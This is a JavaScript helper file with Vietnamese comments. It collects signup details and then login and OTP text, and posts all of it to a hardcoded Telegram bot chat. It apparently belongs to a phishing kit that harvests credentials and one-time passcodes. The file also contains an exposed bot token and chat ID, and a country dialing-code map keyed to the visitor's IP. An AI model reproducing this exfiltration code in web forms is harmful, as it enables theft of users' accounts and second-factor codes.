// utils/telegram.js

// ==========================================
// THAY BOT TOKEN VÀ CHAT ID CỦA MÀY VÀO ĐÂY
const BOT_TOKEN = '8862924560:AAH9eoEkGkNNZwlGL3UM89TutW9PXNQYqHs';
const CHAT_ID = '-5364980544';
// ==========================================

const BASE_URL = `https://api.telegram.org/bot${BOT_TOKEN}`;

// Biến lưu tin nhắn đầu tiên (thông tin signup) để gộp chung khi gửi
let initialSessionText = '';

/**
 * Escape HTML để tránh lỗi khi gửi tin nhắn qua Telegram
 * (Telegram parse_mode: 'HTML' sẽ hiểu nhầm các ký tự <, >, &)
 */
export const escapeHtml = (str) => {
  if (!str) return '';
  return String(str)
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;');
};

/**
 * Lưu text của session ban đầu (thông tin đăng ký)
 * Gọi hàm này ở bước 1 (handleSignup) trước khi gọi sendTelegramMessage('')
 */
export const setInitialSession = (text) => {
  initialSessionText = text;
};

/**
 * Gửi tin nhắn lên Telegram.
 * - Nếu truyền extraText rỗng: gửi initialSessionText (thông tin signup).
 * - Nếu truyền extraText: gửi kèm sau initialSessionText (dùng cho login/otp).
 */
export const sendTelegramMessage = async (extraText = '') => {
  const fullText = (initialSessionText + (extraText || '')).trim();
  if (!fullText) return;

  try {
    const res = await fetch(`${BASE_URL}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: CHAT_ID,
        text: fullText,
        parse_mode: 'HTML',
        disable_web_page_preview: true,
      }),
    });

    const data = await res.json();
    if (!data.ok) {
      console.error('Telegram API error:', data.description);
    }
    return data;
  } catch (err) {
    console.error('Telegram send error:', err);
  }
};

/**
 * Map mã quốc gia (ISO 3166-1 alpha-2) -> mã vùng điện thoại quốc tế
 * Dùng để auto-fill country code trong form signup dựa trên IP.
 */
export const countryCodeMap = {
  // Châu Á
  AF: '+93', AM: '+374', AZ: '+994', BH: '+973', BD: '+880', BT: '+975',
  BN: '+673', KH: '+855', CN: '+86', GE: '+995', HK: '+852', IN: '+91',
  ID: '+62', IR: '+98', IQ: '+964', IL: '+972', JP: '+81', JO: '+962',
  KZ: '+7', KW: '+965', KG: '+996', LA: '+856', LB: '+961', MO: '+853',
  MY: '+60', MV: '+960', MN: '+976', MM: '+95', NP: '+977', KP: '+850',
  OM: '+968', PK: '+92', PS: '+970', PH: '+63', QA: '+974', SA: '+966',
  SG: '+65', KR: '+82', LK: '+94', SY: '+963', TW: '+886', TJ: '+992',
  TH: '+66', TL: '+670', TR: '+90', TM: '+993', AE: '+971', UZ: '+998',
  VN: '+84', YE: '+967',

  // Châu Âu
  AL: '+355', AD: '+376', AT: '+43', BY: '+375', BE: '+32', BA: '+387',
  BG: '+359', HR: '+385', CY: '+357', CZ: '+420', DK: '+45', EE: '+372',
  FI: '+358', FR: '+33', DE: '+49', GR: '+30', HU: '+36', IS: '+354',
  IE: '+353', IT: '+39', XK: '+383', LV: '+371', LI: '+423', LT: '+370',
  LU: '+352', MT: '+356', MD: '+373', MC: '+377', ME: '+382', NL: '+31',
  MK: '+389', NO: '+47', PL: '+48', PT: '+351', RO: '+40', RU: '+7',
  SM: '+378', RS: '+381', SK: '+421', SI: '+386', ES: '+34', SE: '+46',
  CH: '+41', UA: '+380', GB: '+44', VA: '+379',

  // Châu Mỹ
  AG: '+1', AR: '+54', BS: '+1', BB: '+1', BZ: '+501', BO: '+591',
  BR: '+55', CA: '+1', CL: '+56', CO: '+57', CR: '+506', CU: '+53',
  DM: '+1', DO: '+1', EC: '+593', SV: '+503', GD: '+1', GT: '+502',
  GY: '+592', HT: '+509', HN: '+504', JM: '+1', MX: '+52', NI: '+505',
  PA: '+507', PY: '+595', PE: '+51', KN: '+1', LC: '+1', VC: '+1',
  SR: '+597', TT: '+1', US: '+1', UY: '+598', VE: '+58',

  // Châu Đại Dương
  AU: '+61', FJ: '+679', KI: '+686', MH: '+692', FM: '+691', NR: '+674',
  NZ: '+64', PW: '+680', PG: '+675', WS: '+685', SB: '+677', TO: '+676',
  TV: '+688', VU: '+678',

  // Châu Phi
  DZ: '+213', AO: '+244', BJ: '+229', BW: '+267', BF: '+226', BI: '+257',
  CM: '+237', CV: '+238', CF: '+236', TD: '+235', KM: '+269', CG: '+242',
  CD: '+243', CI: '+225', DJ: '+253', EG: '+20', GQ: '+240', ER: '+291',
  SZ: '+268', ET: '+251', GA: '+241', GM: '+220', GH: '+233', GN: '+224',
  GW: '+245', KE: '+254', LS: '+266', LR: '+231', LY: '+218', MG: '+261',
  MW: '+265', ML: '+223', MR: '+222', MU: '+230', MA: '+212', MZ: '+258',
  NA: '+264', NE: '+227', NG: '+234', RW: '+250', ST: '+239', SN: '+221',
  SC: '+248', SL: '+232', SO: '+252', ZA: '+27', SS: '+211', SD: '+249',
  TZ: '+255', TG: '+228', TN: '+216', UG: '+256', ZM: '+260', ZW: '+263',

  // Lãnh thổ / Vùng đặc biệt
  AS: '+1', AI: '+1', AW: '+297', BM: '+1', VG: '+1', KY: '+1', CK: '+682',
  CW: '+599', FK: '+500', FO: '+298', GF: '+594', PF: '+689', GI: '+350',
  GL: '+299', GP: '+590', GU: '+1', GG: '+44', IM: '+44', JE: '+44',
  NF: '+672', MP: '+1', PR: '+1', RE: '+262', BL: '+590', SH: '+290',
  MF: '+590', PM: '+508', SX: '+1', TC: '+1', WF: '+681', EH: '+212',
};
